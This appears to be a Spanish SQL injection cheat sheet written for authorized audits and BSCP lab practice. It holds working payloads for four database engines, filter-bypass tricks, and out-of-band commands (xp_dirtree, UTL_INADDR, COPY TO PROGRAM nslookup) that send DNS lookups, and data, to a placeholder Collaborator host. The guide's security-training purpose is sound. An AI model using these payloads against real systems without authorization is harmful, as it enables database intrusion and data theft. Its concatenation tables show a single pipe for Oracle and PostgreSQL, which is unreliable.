#BSCP #SQLinjection 

> [!info] Objetivo  
> Guía práctica para identificar, clasificar y enumerar vulnerabilidades SQL Injection durante auditorías autorizadas y laboratorios. Incluye sintaxis específica para **MySQL, PostgreSQL, Microsoft SQL Server (MSSQL) y Oracle**.
> 
> Los ejemplos son plantillas: adapta el contexto de comillas, paréntesis, parámetros y comentarios a la consulta vulnerable. No todos los payloads funcionan en todos los contextos.

---

## 1. Flujo de trabajo

1. Identificar parámetros controlables y establecer una petición de referencia.
2. Comprobar si la entrada modifica la consulta SQL.
3. Determinar el contexto de inyección: numérico, cadena, dentro de paréntesis, etc.
4. Identificar el tipo de SQLi: in-band, error-based, blind boolean, blind time-based, OOB o stacked.
5. Identificar el DBMS y, si es posible, su versión.
6. Enumerar contexto, bases de datos/esquemas, tablas y columnas.
7. Extraer únicamente los datos necesarios para demostrar el impacto.
8. Documentar petición, payload, respuesta, evidencia, impacto y limitaciones.

---

## 2. Identificación de SQL Injection

### 2.1. Preparar una línea base

- Intercepta la petición con Burp Suite.
- Identifica parámetros GET, POST, cookies, cabeceras y valores JSON/XML que puedan llegar a una consulta SQL.
- Envía varias veces la petición original y observa el comportamiento normal.
- Cambia un único parámetro cada vez.
- Compara código HTTP, longitud, contenido, redirecciones y tiempo de respuesta.

No concluyas que existe SQLi únicamente porque una comilla produce un error: puede ser validación de entrada o un error de aplicación.

### 2.2. Pruebas iniciales

Si el parámetro parece estar dentro de una cadena:

```
'
''
"
''
'--
'#
'/*
```

Si parece ser numérico:

```
1
1'
1"
1 AND 1=1
1 AND 1=2
1 OR 1=1
```

Prueba también expresiones que deberían ser equivalentes:

```
' AND '1'='1
' AND '1'='2
```

**Interpretación:**

- Error SQL reproducible al alterar la sintaxis: posible SQLi basada en errores.
- La condición verdadera devuelve el comportamiento normal y la falsa lo modifica: posible blind boolean-based.
- La respuesta cambia según una condición, aunque no haya errores visibles: posible blind SQLi.
- La petición tarda de forma reproducible cuando se cumple una condición: posible time-based.
- Aparece una interacción DNS/HTTP en un dominio controlado: posible OOB.
- Se pueden ejecutar varias sentencias independientes: posible stacked queries.

> [!warning] Importante  
> Utiliza controles repetidos. Una diferencia aislada puede deberse a latencia, caché, balanceo, WAF o lógica de negocio. En time-based compara varias peticiones de control y de prueba.

### 2.3. Identificar el contexto de inyección

La aplicación podría construir consultas como estas:

```
-- Contexto de cadena
SELECT * FROM users WHERE username = 'INPUT';

-- Contexto numérico
SELECT * FROM products WHERE id = INPUT;

-- Contexto dentro de paréntesis
SELECT * FROM products WHERE id = (INPUT);

-- Contexto de búsqueda
SELECT * FROM products WHERE name LIKE '%INPUT%';
```

El objetivo es averiguar qué parte de la sintaxis original hay que cerrar y cómo neutralizar el resto de la consulta.

Ejemplos conceptuales:

```
' OR '1'='1'--
1 OR 1=1--
') OR ('1'='1'--
```

Los comentarios y sus requisitos dependen del DBMS y del contexto.

## 3. Tipos de SQL Injection

### 3.1. In-band SQLi

La información obtenida mediante la consulta inyectada se refleja en la respuesta HTTP.

Variantes principales:

- **UNION-based:** combina el resultado de la consulta original con el resultado de otra consulta.
- **Error-based:** provoca errores que revelan información o resultados de consultas.

### 3.2. Blind SQLi

La aplicación no muestra directamente el resultado de la consulta, pero permite inferirlo.

Variantes:

- **Boolean-based:** se deduce información por diferencias entre respuestas verdaderas y falsas.
- **Time-based:** se deduce información mediante retrasos condicionados.
- **Out-of-band (OOB):** la base de datos genera una interacción de red observable desde un sistema controlado.

### 3.3. Stacked queries

Permiten añadir una segunda sentencia SQL cuando el controlador y el contexto admiten varias sentencias.

No debe confundirse con UNION:

- `UNION` combina resultados dentro de una misma consulta.
- `;` puede separar sentencias independientes, si el entorno lo permite.

---

## 4. Identificar el DBMS (Fingerprinting)

La sintaxis aceptada, los mensajes de error y las funciones disponibles permiten identificar el motor. Conviene contrastar varias señales, ya que una aplicación puede ocultar errores o utilizar una capa intermedia.

### 4.1. Funciones y consultas de identificación

|DBMS|Versión|Usuario actual|Base de datos / contexto|
|---|---|---|---|
|MySQL|`SELECT @@version`|`SELECT CURRENT_USER()`|`SELECT DATABASE()`|
|PostgreSQL|`SELECT version()`|`SELECT current_user`|`SELECT current_database()`|
|MSSQL|`SELECT @@version`|`SELECT SYSTEM_USER`|`SELECT DB_NAME()`|
|Oracle|`SELECT banner FROM v$version`|`SELECT USER FROM dual`|`SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual`|

### 4.2. Particularidades

|Característica|MySQL|PostgreSQL|MSSQL|Oracle|
|---|---|---|---|---|
|Concatenación|`CONCAT('a','b')` o `'a' 'b'`|`'a' \| 'b'`|`'a'+'b'`|`'a' \| 'b'`|
|Subcadena|`SUBSTRING()`|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|
|Longitud|`LENGTH()`|`LENGTH()`|`LEN()`|`LENGTH()`|
|Comentario línea|`#`, `--`|`--`|`--`|`--`|
|Comentario bloque|`/* */`|`/* */`|`/* */`|`/* */`|
|Espera|`SLEEP()`|`pg_sleep()`|`WAITFOR DELAY`|`DBMS_PIPE.RECEIVE_MESSAGE()`|

> [!note]  
> En MySQL, `--` normalmente necesita un espacio o carácter de control después de los dos guiones. `#` es otra alternativa. Oracle requiere habitualmente `FROM dual` en consultas SELECT que no leen una tabla real.

## 5. Enumeración: orden recomendado

La enumeración depende de la información que permita observar la vulnerabilidad.

|Técnica|Qué permite hacer|Limitación habitual|
|---|---|---|
|UNION-based|Obtener resultados directamente en la respuesta|Hay que ajustar columnas y tipos compatibles|
|Error-based|Hacer que los errores revelen valores|Depende de que los errores sean visibles y no estén filtrados|
|Boolean-based|Inferir caracteres o valores mediante condiciones|Puede requerir muchas peticiones|
|Time-based|Inferir condiciones por tiempo|Lento y sensible a la latencia|
|OOB|Obtener información mediante interacciones de red|Requiere funciones, permisos y salida de red|

Secuencia habitual:

1. DBMS y versión.
2. Usuario actual y contexto.
3. Bases de datos o esquemas accesibles.
4. Tablas.
5. Columnas.
6. Filas y valores relevantes.

No todos los motores distinguen de la misma forma entre base de datos, esquema y usuario. En Oracle, por ejemplo, el esquema suele estar asociado al usuario.

# 6. Enumeración por DBMS

## 6.1. MySQL

### Identificar contexto

```
SELECT @@version;
SELECT USER();
SELECT CURRENT_USER();
SELECT DATABASE();
```

Diferencia útil:

- `USER()` muestra la identidad presentada por el cliente.
- `CURRENT_USER()` indica la cuenta que MySQL utiliza para comprobar privilegios.

### Enumerar bases de datos

```
SELECT schema_name
FROM information_schema.schemata;
```

Base de datos actual:

```
SELECT DATABASE();
```

### Enumerar tablas

Todas las tablas visibles:

```
SELECT table_schema, table_name
FROM information_schema.tables;
```

Tablas de la base de datos actual:

```
SELECT table_name
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

Tablas de una base de datos concreta:

```
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'nombre_bd';
```

### Enumerar columnas

```
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = DATABASE()
  AND table_name = 'users';
```

También se puede consultar el orden de las columnas:

```
SELECT ordinal_position, column_name, data_type
FROM information_schema.columns
WHERE table_schema = DATABASE()
  AND table_name = 'users'
ORDER BY ordinal_position;
```

### Extraer registros

```
SELECT username, password
FROM users
LIMIT 10;
```

Extraer una fila concreta:

```
SELECT username, password
FROM users
LIMIT 1 OFFSET 0;
```

### Particularidades MySQL

- `information_schema` es el catálogo habitual para enumerar esquemas, tablas y columnas.
- `DATABASE()` devuelve la base de datos seleccionada en la conexión.
- `LIMIT n OFFSET m` permite paginar resultados.
- `GROUP_CONCAT()` puede agrupar varios valores en una sola cadena, aunque tiene un límite de longitud configurable.
- Los permisos del usuario SQL pueden restringir qué metadatos aparecen.

Ejemplo de concatenación de nombres de tablas:

```
SELECT GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = DATABASE();
```

---

## 6.2. PostgreSQL

### Identificar contexto

```
SELECT version();
SELECT current_user;
SELECT session_user;
SELECT current_database();
SELECT current_schema();
```

### Enumerar bases de datos

```
SELECT datname
FROM pg_database;
```

También puede consultarse el catálogo estándar:

```
SELECT schema_name
FROM information_schema.schemata;
```

### Enumerar esquemas

```
SELECT schema_name
FROM information_schema.schemata;
```

### Enumerar tablas

Tablas visibles mediante `information_schema`:

```
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_type = 'BASE TABLE';
```

Tablas de un esquema concreto:

```
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'public';
```

Alternativa mediante catálogo interno:

```
SELECT schemaname, tablename
FROM pg_tables;
```

### Enumerar columnas

```
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public'
  AND table_name = 'users';
```

Orden de las columnas:

```
SELECT ordinal_position, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public'
  AND table_name = 'users'
ORDER BY ordinal_position;
```

### Extraer registros

```
SELECT username, password
FROM public.users
LIMIT 10 OFFSET 0;
```

### Particularidades PostgreSQL

- PostgreSQL separa bases de datos y esquemas.
- `current_database()` identifica la base de datos conectada.
- `current_schema()` devuelve el esquema actual de búsqueda.
- `information_schema` ofrece una interfaz estándar; `pg_catalog` contiene catálogos propios del motor.
- `pg_tables` facilita consultar tablas y esquemas.
- `LIMIT` y `OFFSET` permiten paginar.

Ejemplo de concatenación:

```
SELECT string_agg(table_name, ',')
FROM information_schema.tables
WHERE table_schema = 'public';
```

---

## 6.3. Microsoft SQL Server (MSSQL)

### Identificar contexto

```
SELECT @@version;
SELECT SYSTEM_USER;
SELECT CURRENT_USER;
SELECT DB_NAME();
```

### Enumerar bases de datos

```
SELECT name
FROM sys.databases;
```

Alternativa:

```
SELECT name
FROM master.sys.databases;
```

La visibilidad depende de los permisos del usuario.

### Enumerar esquemas

```
SELECT schema_name
FROM information_schema.schemata;
```

### Enumerar tablas

Mediante `information_schema`:

```
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_type = 'BASE TABLE';
```

Mediante catálogos del sistema:

```
SELECT s.name AS schema_name,
       t.name AS table_name
FROM sys.tables AS t
JOIN sys.schemas AS s
  ON t.schema_id = s.schema_id;
```

### Enumerar columnas

```
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_name = 'users';
```

Especificando esquema:

```
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'dbo'
  AND table_name = 'users';
```

Alternativa con catálogos internos:

```
SELECT c.name AS column_name,
       ty.name AS data_type
FROM sys.columns AS c
JOIN sys.types AS ty
  ON c.user_type_id = ty.user_type_id
WHERE c.object_id = OBJECT_ID('dbo.users');
```

### Extraer registros

```
SELECT TOP 10 username, password
FROM dbo.users;
```

Paginación con orden:

```
SELECT username, password
FROM dbo.users
ORDER BY username
OFFSET 0 ROWS FETCH NEXT 10 ROWS ONLY;
```

### Particularidades MSSQL

- `sys.databases`, `sys.tables`, `sys.schemas` y `sys.columns` son catálogos habituales.
- `DB_NAME()` devuelve la base de datos actual.
- `TOP` limita el número de filas.
- `OFFSET ... FETCH` permite paginar y requiere `ORDER BY`.
- `LEN()` devuelve la longitud de una cadena, sin contar espacios finales.
- `CHAR()` permite construir caracteres a partir de su código.
- La ejecución de varias sentencias depende del controlador y del contexto de la consulta.

Ejemplo de concatenación:

```
SELECT STRING_AGG(name, ',')
FROM sys.tables;
```

`STRING_AGG` está disponible en versiones modernas; comprueba la versión y compatibilidad del entorno.

## 6.4. Oracle

### Identificar contexto

```
SELECT banner FROM v$version;
SELECT USER FROM dual;
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual;
```

`v$version` puede requerir permisos específicos. Si no es accesible, la consulta puede fallar aunque la inyección exista.

### Enumerar esquemas y usuarios

```
SELECT username
FROM all_users;
```

### Enumerar tablas

Tablas accesibles para el usuario:

```
SELECT owner, table_name
FROM all_tables;
```

Tablas propias:

```
SELECT table_name
FROM user_tables;
```

Tablas de un propietario concreto:

```
SELECT table_name
FROM all_tables
WHERE owner = 'HR';
```

### Enumerar columnas

Columnas de una tabla accesible:

```
SELECT owner, table_name, column_name, data_type
FROM all_tab_columns
WHERE owner = 'HR'
  AND table_name = 'USERS';
```

Columnas de tablas propias:

```
SELECT column_name, data_type
FROM user_tab_columns
WHERE table_name = 'USERS';
```

> [!warning] Oracle y mayúsculas  
> Los identificadores no entrecomillados suelen almacenarse en mayúsculas. Por eso es habitual buscar `USERS` y no `users`. Si se crearon identificadores entre comillas, puede ser necesario respetar exactamente su capitalización.

### Extraer registros

```
SELECT username, password
FROM users
FETCH FIRST 10 ROWS ONLY;
```

Alternativa para versiones anteriores:

```
SELECT username, password
FROM users
WHERE ROWNUM <= 10;
```

### Particularidades Oracle

- Oracle diferencia entre usuario, esquema y base de datos.
- `USER_TABLES` muestra tablas propias.
- `ALL_TABLES` muestra tablas accesibles.
- `DBA_TABLES` puede mostrar información más amplia, pero requiere privilegios elevados.
- `USER_TAB_COLUMNS`, `ALL_TAB_COLUMNS` y `DBA_TAB_COLUMNS` siguen la misma lógica para columnas.
- Muchas consultas SELECT independientes requieren `FROM dual`.
- `ROWNUM` es habitual en versiones antiguas; `FETCH FIRST` está disponible en versiones modernas.

# 7. UNION-based SQL Injection

Permite combinar los resultados de la consulta original con los de una consulta inyectada.

## 7.1. Encontrar el número de columnas

Hay dos métodos habituales.

### Método A: ORDER BY

Incrementa el índice hasta que la consulta deja de funcionar:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

Cuando un índice produce un error y el anterior no, el número de columnas suele ser el último índice válido.

**Ejemplo:** `ORDER BY 3` funciona y `ORDER BY 4` falla: probablemente hay tres columnas.

### Método B: UNION SELECT

Prueba diferentes cantidades de valores:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
```

Cuando la consulta deja de producir un error de número de columnas, has encontrado una cantidad compatible.

> [!note]  
> `NULL` es útil porque puede ser compatible con muchos tipos. Aun así, el DBMS o la consulta pueden exigir conversiones concretas.

## 7.2. Identificar columnas visibles

Una vez conocido el número de columnas, sustituye los `NULL` por marcadores:

```
' UNION SELECT 'A','B','C'--
```

Observa cuáles aparecen en la respuesta. Esas posiciones son candidatas para mostrar datos.

Si una posición no acepta texto, prueba una expresión compatible con su tipo. En algunos motores puede ser necesario convertir explícitamente el valor.

## 7.3. Obtener información del DBMS

Ejemplo conceptual para una posición visible:

```
' UNION SELECT NULL,@@version,NULL--
```

La función concreta depende del DBMS. Consulta la sección de fingerprinting.

## 7.4. Enumerar tablas y columnas

Una vez identificada una columna visible, utiliza las consultas de catálogo de la sección del DBMS correspondiente.

Ejemplo MySQL, suponiendo tres columnas y una posición de texto visible:

```
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables
WHERE table_schema = DATABASE()--
```

Ejemplo PostgreSQL:

```
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables
WHERE table_schema = 'public'--
```

Ejemplo MSSQL:

```
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables--
```

Ejemplo Oracle:

```
' UNION SELECT NULL,table_name,NULL
FROM user_tables--
```

**Recuerda:** estos ejemplos ilustran la consulta de enumeración, pero el número y los tipos de columnas deben coincidir con la consulta original. Oracle puede requerir adaptar el contexto y las conversiones.

# 8. Error-based SQL Injection

Se aprovechan errores generados por el motor para revelar información.

## 8.1. Identificar errores

Busca diferencias entre:

- Error de sintaxis.
- Error de conversión de tipos.
- Error de función.
- Error de XML/XPath.
- Error de subconsulta.

La información que se filtra depende del motor, la configuración y el tratamiento de errores de la aplicación.

## 8.2. Ejemplos por DBMS

### MSSQL: conversión de tipos

```
SELECT CAST('texto' AS INT);
```

Un error de conversión puede incluir el valor que no pudo convertirse.

### PostgreSQL: conversión de tipos

```
SELECT CAST('texto' AS INTEGER);
```

El mensaje de error puede mostrar el valor no válido.

### MySQL: error XPath

```
SELECT EXTRACTVALUE(1, CONCAT(0x5c, 'texto'));
```

Puede provocar un error XPath que incluya parte de la expresión. `EXTRACTVALUE()` está obsoleta en versiones modernas y puede no estar disponible.

### Oracle: errores de conversión/XML

Oracle dispone de errores de conversión y funciones XML, pero su utilidad depende de la versión y de los privilegios. No asumas que una técnica de error de MySQL o PostgreSQL será portable a Oracle.

## 8.3. Extraer información mediante errores

El patrón general es:

1. Ejecutar una subconsulta que obtenga el dato que interesa.
2. Forzar que el resultado se utilice en una operación incompatible.
3. Comprobar si el mensaje de error refleja el valor.
4. Repetir con el siguiente registro o campo.

Ejemplo conceptual PostgreSQL:

```
SELECT CAST((SELECT current_database()) AS INTEGER);
```

Ejemplo conceptual MSSQL:

```
SELECT CAST((SELECT DB_NAME()) AS INT);
```

# 9. Blind SQL Injection — Boolean-based

Se utiliza cuando la aplicación no devuelve los datos de la consulta, pero sí muestra comportamientos diferentes según el resultado de una condición.

## 9.1. Confirmar la vulnerabilidad

Compara una condición verdadera y otra falsa:

```
' AND 1=1--
' AND 1=2--
```

Si la respuesta cambia de forma consistente, puede existir una inyección booleana.

## 9.2. Comprobar la longitud de un dato

Ejemplo genérico:

```
LENGTH((SELECT current_database())) > 5
```

Funciones de longitud:

|DBMS|Función|
|---|---|
|MySQL|`LENGTH()`|
|PostgreSQL|`LENGTH()`|
|MSSQL|`LEN()`|
|Oracle|`LENGTH()`|

Ejemplo PostgreSQL, para comprobar la longitud del nombre de la base de datos:

```
LENGTH((SELECT current_database())) = 8
```

## 9.3. Extraer caracteres

La técnica consiste en:

1. Determinar la longitud del valor.
2. Seleccionar una posición.
3. Comparar el carácter con un valor conocido o con un código ASCII.
4. Observar si la condición es verdadera o falsa.
5. Repetir para cada posición.

Funciones de subcadena:

|DBMS|Sintaxis|
|---|---|
|MySQL|`SUBSTRING(valor, posición, longitud)`|
|PostgreSQL|`SUBSTRING(valor FROM posición FOR longitud)` o `SUBSTRING(valor, posición, longitud)`|
|MSSQL|`SUBSTRING(valor, posición, longitud)`|
|Oracle|`SUBSTR(valor, posición, longitud)`|

Ejemplo:

```
SUBSTRING((SELECT current_database()),1,1) = 'a'
```

La posición inicial es **1** en estos ejemplos.

## 9.4. Catálogos para enumeración booleana

Una vez identificada la técnica, se puede aplicar a cualquier consulta escalar de catálogo:

- Nombre de base de datos.
- Nombre de esquema.
- Nombre de tabla.
- Nombre de columna.
- Valor de una fila.

Ejemplo conceptual:

```
(SELECT table_name
 FROM information_schema.tables
 WHERE table_schema = 'public'
 LIMIT 1)
```

La consulta interna debe devolver un único valor cuando se utiliza como subconsulta escalar. Para obtener el siguiente resultado, se utiliza paginación o una condición que seleccione otra fila.

# 10. Blind SQL Injection — Time-based

Se utiliza cuando no hay diferencias visibles fiables en la respuesta, pero se puede provocar un retraso condicionado.

## 10.1. Retraso incondicional

|DBMS|Ejemplo|
|---|---|
|MySQL|`SELECT SLEEP(5)`|
|PostgreSQL|`SELECT pg_sleep(5)`|
|MSSQL|`WAITFOR DELAY '0:0:5'`|
|Oracle|`DBMS_PIPE.RECEIVE_MESSAGE('a',5)`|

La sintaxis debe adaptarse al punto de inyección. Por ejemplo, `WAITFOR` es una sentencia de MSSQL y no una expresión escalar equivalente a `SLEEP()`.

## 10.2. Retraso condicionado

La lógica es:

```
SI la condición es verdadera:
    esperar varios segundos
SI es falsa:
    responder normalmente
```

Ejemplos de referencia:

### MySQL

```
SELECT IF(1=1,SLEEP(5),0);
```

### PostgreSQL

```
SELECT CASE
  WHEN 1=1 THEN pg_sleep(5)
  ELSE pg_sleep(0)
END;
```

### MSSQL

```
IF (1=1)
  WAITFOR DELAY '0:0:5';
```

### Oracle

```
SELECT CASE
  WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5)
  ELSE 0
END
FROM dual;
```

La disponibilidad de `DBMS_PIPE` depende de los permisos y del entorno.

## 10.3. Enumerar mediante tiempo

Se puede aplicar el mismo proceso de boolean-based:

1. Comprobar si la longitud de un valor supera un número.
2. Comprobar el carácter de una posición.
3. Provocar el retraso solo cuando la condición sea verdadera.
4. Repetir hasta reconstruir el valor.

**Precauciones:**

- Utiliza retrasos moderados.
- Realiza peticiones de control.
- Repite las pruebas para descartar latencia normal.
- Evita concurrencia elevada: puede degradar el servicio.
- Ten en cuenta timeouts, cachés, WAF y límites de peticiones.

# 11. Out-of-band (OOB) SQL Injection

Permite que la base de datos genere una interacción de red hacia un sistema que controlas, por ejemplo Burp Collaborator.

Es útil cuando la aplicación no refleja resultados y las técnicas boolean/time-based no son prácticas.

## 11.1. Proceso de validación

1. Genera un subdominio único en Burp Collaborator.
2. Introduce una prueba OOB adecuada para el DBMS.
3. Envía la petición.
4. Consulta las interacciones recibidas.
5. Correlaciona la interacción con la hora y el identificador de la prueba.
6. Distingue DNS de HTTP/SMB y evita atribuir interacciones ajenas a tu prueba.

Una interacción DNS demuestra que se produjo una resolución, pero no necesariamente que se haya exfiltrado información.

## 11.2. Técnicas por DBMS

### MSSQL — `xp_dirtree`

```
EXEC master..xp_dirtree '\\SUBDOMINIO-COLLABORATOR\share';
```

El acceso a una ruta UNC puede provocar una resolución de nombre. Depende del entorno Windows, permisos y configuración.

### Oracle — `UTL_INADDR`

```
SELECT UTL_INADDR.GET_HOST_ADDRESS('SUBDOMINIO-COLLABORATOR')
FROM dual;
```

Puede requerir privilegios y permisos de red ACL.

Oracle también dispone de paquetes de red como `UTL_HTTP`, sujetos a permisos y configuración.

### PostgreSQL — ejecución de programas

La técnica basada en `COPY ... TO PROGRAM` requiere privilegios elevados (habitualmente superusuario o permisos específicos):

```
COPY (SELECT '') TO PROGRAM 'nslookup SUBDOMINIO-COLLABORATOR';
```

No suele estar disponible para usuarios de aplicación con permisos limitados.

### MySQL — acceso a recursos UNC

En determinados entornos Windows, operaciones de lectura o escritura de archivos pueden provocar una resolución de nombre. Dependen de la configuración, permisos y versión. No debe asumirse que están disponibles en Linux.

## 11.3. OOB con exfiltración

El concepto consiste en incorporar un dato consultado dentro del nombre de host o recurso solicitado.

Flujo:

1. Ejecutar una subconsulta que obtenga un valor.
2. Construir una petición DNS/HTTP/SMB cuyo destino incluya ese valor.
3. Observar la interacción en Collaborator.
4. Recuperar el dato desde el registro de la interacción, si el protocolo y la técnica lo permiten.

Limitaciones:

- Los nombres DNS tienen restricciones de longitud y caracteres.
- Los datos pueden necesitar codificación.
- Los resolvers pueden truncar, normalizar o cachear consultas.
- La salida de red puede estar bloqueada.
- El DBMS puede requerir permisos elevados.
- No todos los canales OOB permiten transportar datos de forma fiable.

# 12. Stacked queries

Permiten ejecutar una sentencia adicional después de la consulta original, si el motor, el controlador y el punto de inyección lo admiten.

|DBMS|Separación habitual|
|---|---|
|MySQL|`;`|
|PostgreSQL|`;`|
|MSSQL|`;`|
|Oracle|No admite de forma general stacked queries en el mismo sentido que los anteriores|

Ejemplo conceptual:

```
QUERY_ORIGINAL; SELECT 1;
```

### Consideraciones por motor

- **MSSQL:** es habitual que el separador `;` permita varias sentencias en un lote.
- **PostgreSQL:** admite varias sentencias en determinados contextos y protocolos.
- **MySQL:** el soporte depende especialmente del conector y de si permite multi-statements.
- **Oracle:** las consultas SQL y los bloques PL/SQL tienen reglas distintas; no debe asumirse que se pueden concatenar sentencias arbitrarias con `;` desde una inyección SQL normal.

Aunque la segunda sentencia se ejecute, su resultado puede no mostrarse en la respuesta HTTP. Por eso stacked queries suele combinarse con errores, retrasos o interacciones OOB.

# 13. Concatenación, subcadenas y comentarios

## 13.1. Concatenación

|DBMS|Ejemplo|
|---|---|
|MySQL|`CONCAT('foo','bar')`|
|PostgreSQL|`'foo' \| 'bar'`|
|MSSQL|`'foo'+'bar'`|
|Oracle|`'foo' \| 'bar'`|

## 13.2. Subcadenas

El índice inicial de los ejemplos es 1.

|DBMS|Ejemplo|
|---|---|
|MySQL|`SUBSTRING('foobar',4,2)`|
|PostgreSQL|`SUBSTRING('foobar',4,2)`|
|MSSQL|`SUBSTRING('foobar',4,2)`|
|Oracle|`SUBSTR('foobar',4,2)`|

Todos los ejemplos devuelven `ba`.

## 13.3. Comentarios

|DBMS|Comentario de línea|Comentario de bloque|
|---|---|---|
|MySQL|`#` o `--`|`/* comentario */`|
|PostgreSQL|`--`|`/* comentario */`|
|MSSQL|`--`|`/* comentario */`|
|Oracle|`--`|`/* comentario */`|

En MySQL, `--` requiere normalmente un espacio o carácter de control después del segundo guion.

## 13.4. Bypass de filtros

En pruebas autorizadas, si un filtro bloquea determinados caracteres o palabras, conviene comprobar primero qué transformación está aplicando.

Técnicas que pueden ser relevantes:

- Variar mayúsculas/minúsculas: `SELECT`, `SeLeCt`.
- Sustituir espacios por comentarios inline: `SELECT/**/1`.
- Codificación URL de caracteres.
- Construcción de cadenas mediante funciones como `CHAR()`.
- Comentarios versionados de MySQL: `/*! ... */`.

Ejemplo MySQL:

```
/*!SELECT*/ 1;
```

No todos los filtros son iguales: una codificación solo sirve si la aplicación o el componente posterior la decodifica antes de procesar la consulta.

# 14. Funciones útiles para automatizar la extracción

|Objetivo|MySQL|PostgreSQL|MSSQL|Oracle|
|---|---|---|---|---|
|Longitud|`LENGTH()`|`LENGTH()`|`LEN()`|`LENGTH()`|
|Subcadena|`SUBSTRING()`|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|
|Código de carácter|`ASCII()`|`ASCII()`|`ASCII()`|`ASCII()`|
|Concatenar|`CONCAT()`|`\|`|`+`|`\|`|
|Limitar filas|`LIMIT`|`LIMIT`|`TOP` / `OFFSET FETCH`|`FETCH FIRST` / `ROWNUM`|

Para una extracción carácter a carácter:

1. Consulta la longitud del valor.
2. Selecciona una posición.
3. Obtén su código numérico con `ASCII()`.
4. Comprueba condiciones sobre ese código.
5. Repite para cada posición.

Para optimizar el número de peticiones se pueden utilizar búsquedas binarias en lugar de probar todos los caracteres posibles uno por uno.

# 15. Errores frecuentes durante la enumeración

|Problema|Posible causa|Qué comprobar|
|---|---|---|
|`UNION SELECT` falla|Número de columnas incorrecto|Probar `ORDER BY` o diferentes cantidades de `NULL`|
|Error de tipos|Tipos incompatibles entre columnas|Usar `NULL` y después marcadores compatibles|
|No aparecen tablas|Esquema incorrecto o permisos limitados|Consultar el esquema actual y los catálogos visibles|
|La tabla existe, pero no aparecen columnas|Nombre, esquema o capitalización incorrectos|Revisar propietario/esquema y mayúsculas|
|No funciona el comentario|Sintaxis del DBMS o contexto incorrecto|Probar el comentario adecuado y revisar espacios|
|Time-based inestable|Latencia, carga o timeout|Repetir controles y reducir concurrencia|
|No llega DNS|Sin salida de red o permisos insuficientes|Validar el canal y las capacidades del DBMS|
|Error en subconsulta|Devuelve varias filas cuando se esperaba una|Limitar o seleccionar una fila concreta|
|La consulta funciona en consola, pero no en la aplicación|Driver, contexto o filtros|Adaptar la sentencia al punto de inyección real|
